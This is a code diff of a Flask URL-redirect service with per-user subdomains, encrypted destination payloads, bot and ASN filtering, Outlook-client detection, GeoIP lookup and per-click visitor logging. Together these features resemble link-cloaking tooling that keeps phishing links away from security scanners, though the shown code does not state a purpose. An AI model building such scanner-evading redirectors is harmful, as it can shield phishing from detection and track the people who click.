-        theme_seed = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()[:6]
-        primary_color = f"#{theme_seed}"
-
-        return render_template_string("""
-            <!DOCTYPE html>
-            <html lang="en">
-            <head>
-                <meta charset="UTF-8">
-                <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <meta name="robots" content="noindex, nofollow">
-                <title>Generated URL</title>
-                <script src="https://cdn.tailwindcss.com"></script>
-                <style>
-                    body { background: {{ primary_color }}; }
-                    .container { animation: slideIn 0.5s ease-out; }
-                    @keyframes slideIn { from { transform: translateY(-20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-                    a:hover { text-decoration: underline; }
-                </style>
-            </head>
-            <body class="min-h-screen flex items-center justify-center p-4">
-                <div class="container bg-white p-8 rounded-xl shadow-2xl max-w-lg w-full text-center">
-                    <h3 class="text-2xl font-bold mb-4 text-gray-900">Your Secure URL</h3>
-                    <p class="text-gray-600 mb-4">Copy or click your generated URL below:</p>
-                    <a href="{{ url }}" target="_blank" class="text-indigo-600 break-all">{{ url }}</a>
-                    <p class="mt-4 text-sm text-gray-500">This URL will redirect to the destination.</p>
-                </div>
-            </body>
-            </html>
-        """, url=generated_url, primary_color=primary_color)
-    except Exception as e:
-        logger.error(f"Internal Server Error in generate: {str(e)}", exc_info=True)
-        raise
-
 @app.route("/<endpoint>/<path:encrypted_payload>/<path:path_segment>", methods=["GET"], subdomain="<username>")
 @rate_limit(limit=5, per=60)
 def redirect_handler(username, endpoint, encrypted_payload, path_segment):
     try:
         user_agent = request.headers.get("User-Agent", "")
         ip = request.remote_addr
-        logger.debug(f"Redirect handler for {username}.{BASE_DOMAIN}/{endpoint}, IP: {ip}, User-Agent: {user_agent}, Path Segment: {path_segment}")
+        headers = request.headers
+        logger.debug(f"Redirect handler for {username}.{BASE_DOMAIN}/{endpoint}, IP: {ip}, User-Agent: {user_agent}")
 
-        # Relaxed anti-bot checks
-        bot_detected = is_bot(user_agent)
+        # Bot detection
+        is_bot_flag, bot_reason = is_bot(user_agent, headers)
         asn_blocked = check_asn(ip)
-        logger.debug(f"Anti-bot checks: bot_detected={bot_detected}, asn_blocked={asn_blocked}")
+        ua = parse(user_agent)
+        device = "Desktop"
+        if ua.is_mobile:
+            device = "Android" if "Android" in user_agent else "iPhone" if "iPhone" in user_agent else "Mobile"
+        app = "Unknown"
+        if "Outlook" in user_agent:
+            app = "Outlook"
+        elif ua.browser.family:
+            app = ua.browser.family
+        visit_type = "Human"
+        if is_bot_flag or asn_blocked:
+            visit_type = "Bot" if "curl/" in user_agent.lower() else "Mimicry" if "Mimicry" in bot_reason else "Bot"
+        elif app != "Unknown" and app != ua.browser.family:
+            visit_type = "App"
 
+        # GeoIP
+        location = get_geoip(ip)
+
+        # Log visit
+        url_id = hashlib.sha256(request.url.encode()).hexdigest()
+        if redis_client:
+            redis_client.hincrby(f"user:{username}:url:{url_id}", "clicks", 1)
+            redis_client.lpush(f"user:{username}:url:{url_id}:visits", json.dumps({
+                "timestamp": int(time.time()),
+                "ip": ip,
+                "device": device,
+                "app": app,
+                "type": visit_type,
+                "location": location
+            }))
+            redis_client.expire(f"user:{username}:url:{url_id}:visits", DATA_RETENTION_DAYS * 86400)
+
+        # Decrypt payload
         try:
             encrypted_payload = urllib.parse.unquote(encrypted_payload)
             logger.debug(f"Decoded encrypted_payload: {encrypted_payload[:20]}...")
@@ -561,9 +876,13 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
         try:
             data = json.loads(payload)
             redirect_url = data.get("student_link")
+            expiry = data.get("expiry", float('inf'))
             if not redirect_url or not re.match(r"^https?://", redirect_url):
                 logger.error(f"Invalid redirect URL: {redirect_url}")
                 abort(400, "Invalid redirect URL")
+            if time.time() > expiry:
+                logger.warning("URL expired")
+                abort(410, "URL has expired")
             logger.debug(f"Parsed payload: redirect_url={redirect_url}")
         except Exception as e:
             logger.error(f"Payload parsing error: {str(e)}", exc_info=True)
@@ -571,12 +890,10 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
 
         final_url = f"{redirect_url.rstrip('/')}/{path_segment}"
         logger.info(f"Redirecting to {final_url}")
-
-        # Immediate redirect
         return redirect(final_url, code=302)
     except Exception as e:
-        logger.error(f"Internal Server Error in redirect_handler: {str(e)}", exc_info=True)
-        raise
+        logger.error(f"Error in redirect_handler: {str(e)}", exc_info=True)
+        abort(500, "Internal Server Error")
 
 @app.route("/denied", methods=["GET"])
 def denied():
